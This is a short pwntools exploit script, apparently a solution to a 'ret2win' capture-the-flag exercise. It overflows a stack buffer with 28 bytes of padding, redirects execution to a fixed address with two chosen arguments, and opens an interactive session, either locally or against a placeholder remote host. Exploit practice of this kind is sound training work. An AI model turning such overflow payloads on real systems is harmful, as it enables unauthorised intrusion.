#!/usr/bin/env python3

from pwn import *

exe = ELF("./ret2win_params_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)
    
    r.sendlineafter(b':', b'A'*28 + p32(0x8049182) + b'A'*4 + p32(0xdeadbeef) + p32(0xc0debabe))
    r.interactive()


if __name__ == "__main__":
    main()
